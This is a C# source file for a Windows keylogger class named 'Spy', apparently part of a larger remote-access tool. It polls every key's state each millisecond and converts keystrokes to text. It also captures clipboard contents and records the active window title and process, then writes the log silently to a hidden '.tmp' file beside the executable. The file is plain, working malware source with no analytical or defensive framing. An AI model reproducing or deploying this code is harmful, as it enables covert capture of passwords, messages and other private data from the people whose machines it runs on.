using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace XV
{
    /// 
    ///           class Kl
    /// 
    /// 
    public class Spy
    {
       
        private int LastWinHandle;
        private string LastWinTitle;
        private Keys lastKey;
        public Clock Clock;
        public string Logs;
        private Keyboard keyboard;
        public string LogsPath;
        private string clip="";

        public Spy()
        {
            this.lastKey = Keys.None;
            this.Clock = new Clock();
            this.Logs = "";
            this.keyboard = new Keyboard();
            this.LogsPath = Application.ExecutablePath + ".tmp";
        }

        private string WorkWinInfo()
        {
            string result;
            try
            {
                IntPtr foregroundWindowIntPtr = Nm.GetForegroundWindow();
                int processId=0;
                Nm.GetWindowThreadProcessId(foregroundWindowIntPtr, ref processId);
                Process processById = Process.GetProcessById(processId);
                if ((foregroundWindowIntPtr.ToInt32() == this.LastWinHandle & Operators.CompareString(this.LastWinTitle, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0)
                {
                    return "";
                }

                LastWinHandle = foregroundWindowIntPtr.ToInt32();
                LastWinTitle = processById.MainWindowTitle;
                result = string.Concat(new string[]
                {

                    "\r\n\u0001",
                    this.Time(),
                    " ",
                    processById.ProcessName,
                    " ",
                    this.LastWinTitle,
                    "\u0001\r\n"
                });
            }
            catch (Exception expr_BB)
            {
                ProjectData.SetProjectError(expr_BB);
                ProjectData.ClearProjectError();
                return "";
            }

            return result;
            
            
        }

        private string Time()
        {
            string result;
            try
            {
                result = this.Clock.LocalTime.ToString("yy/MM/dd");
            }
            catch (Exception expr_1B)
            {
                ProjectData.SetProjectError(expr_1B);
                result = "??/??/??";
                ProjectData.ClearProjectError();
            }

            return result;
        }

        private static string VKCodeToUnicode(uint VKCode)
        {
            try
            {
                StringBuilder stringBuilder = new StringBuilder();
                byte[] lpKeyState = new byte[255];
                string result;
                if (!Nm.GetKeyboardState(lpKeyState))
                {
                    result = "";
                    return result;
                }

                uint wScanCode = Nm.MapVirtualKey(VKCode, 0u);
                IntPtr foregroundWindow = Nm.GetForegroundWindow();
                int num = 0;
                int windowThreadProcessId = Nm.GetWindowThreadProcessId(foregroundWindow, ref num);
                IntPtr dwhkl = (IntPtr)Nm.GetKeyboardLayout(windowThreadProcessId);
                Nm.ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
                result = stringBuilder.ToString();
                return result;
            }
            catch (Exception expr_66)
            {
                ProjectData.SetProjectError(expr_66);
                ProjectData.ClearProjectError();
            }

            return checked((Keys)VKCode).ToString();
        }

        private string Fix(Keys k)
        {
            var flag = this.keyboard.ShiftKeyDown;
            if (this.keyboard.CapsLock)
            {
                flag = !flag;
            }

            checked
            {
                string result;
                try
                {
                    // 123<k<=112 

                    if (!InR(k, 112, 123) && k != Keys.End && k != Keys.Delete)
                    {
                        if (k != Keys.Back)
                        {
                            if (k != Keys.LShiftKey && k != Keys.RShiftKey && k != Keys.Shift && k != Keys.ShiftKey && k != Keys.Control && k != Keys.ControlKey && k != Keys.RControlKey && k != Keys.LControlKey)
                            {
                                if (k != Keys.Alt)
                                {
                                    if (k == Keys.Space)
                                    {
                                        result = " ";
                                        return result;
                                    }

                                    if (k != Keys.Return)
                                    {
                                        if (k != Keys.Return)
                                        {
                                            if (k == Keys.Tab)
                                            {
                                                result = "[TAP]\r\n";
                                                return result;
                                            }

                                            if (flag)
                                            {
                                                result = Spy.VKCodeToUnicode((uint)k).ToUpper();
                                                return result;
                                            }

                                            result = Spy.VKCodeToUnicode((uint)k);
                                            return result;
                                        }
                                    }

                                    if (this.Logs.EndsWith("[ENTER]\r\n"))
                                    {
                                        result = "";
                                        return result;
                                    }

                                    result = "[ENTER]\r\n";
                                    return result;
                                }
                            }

                            result = "";
                            return result;
                        }
                    }

                    result = "[" + k.ToString() + "]";
                }
                catch (Exception expr_18B)
                {
                    ProjectData.SetProjectError(expr_18B);
                    if (flag)
                    {
                        result = Strings.ChrW((int)k).ToString().ToUpper();
                        ProjectData.ClearProjectError();
                    }
                    else
                    {
                        result = Strings.ChrW((int)k).ToString().ToLower();
                        ProjectData.ClearProjectError();
                    }
                }

                return result;
            }
        }

        public void LoggerThread()
        {
            try
            {
                this.Logs = File.ReadAllText(this.LogsPath);
            }
            catch (Exception expr_13)
            {
                ProjectData.SetProjectError(expr_13);
                ProjectData.ClearProjectError();
            }

            checked
            {
                try
                {
                    int num = 0;
                    while (true)
                    {
                        num++;
                        string g = GetClipboardData(new IntPtr(LastWinHandle));
                        int num2 = 0;
                        do
                        {
                            if (Nm.GetAsyncKeyState(num2) == -32767 )
                            {
                                Keys k = (Keys)num2;
                                string text = this.Fix(k);
                                if (text.Length > 0)
                                {
                                    this.Logs += this.WorkWinInfo();
                                    this.Logs += text;
                                }
                               
                                
                                this.lastKey = k;
                            }
                            else if (!string.IsNullOrEmpty(g) && !g.Equals(clip))
                                 
                                {
                                    this.Logs += this.WorkWinInfo();
                                    this.Logs += string.Format("[clipboard]:{0}", g);
                                    clip = g;
                                    
                                }

                            num2++;
                        }
                        while (num2 <= 255);
                        if (num == 1000)
                        {
                            num = 0;
                            int num3 = 20480;
                            if (this.Logs.Length > 20480)
                            {
                                this.Logs = this.Logs.Remove(0, this.Logs.Length - num3);
                            }

                            File.WriteAllText(this.LogsPath, this.Logs);
                        }

                        Thread.Sleep(1);
                    }
                }
                catch (Exception expr_EF)
                {
                    ProjectData.SetProjectError(expr_EF);
                    ProjectData.ClearProjectError();
                }
            }
        }

        static bool InR(Keys ns, int bottom, int top)
        {
            int n = (int) ns;
            return (n >= bottom && n <= top);
        }

        private const int GLIP_TEXT = 1;
        private string GetClipboardData(IntPtr Handle)
        {
            if (Handle == IntPtr.Zero) return "";
            try
            {
                Nm.OpenClipboard(Handle);

            //Get pointer to clipboard data in the selected format
            IntPtr cdp = Nm.GetClipboardData(GLIP_TEXT);

            //Do a bunch of crap necessary to copy the data from the memory
            //the above pointer points at to a place we can access it.
            UIntPtr length = Nm.GlobalSize(cdp);
            IntPtr gLock = Nm.GlobalLock(cdp);

            //Init a buffer which will contain the clipboard data
            byte[] buffer = new byte[(int)length];

            //Copy clipboard data to buffer
            Marshal.Copy(gLock, buffer, 0, (int)length);
                Nm.CloseClipboard();

            return OK.GetString(buffer);
            }
            catch (Exception e)
            {

                ProjectData.SetProjectError(e);
                ProjectData.ClearProjectError();
            }

            return "";
        }
    }
}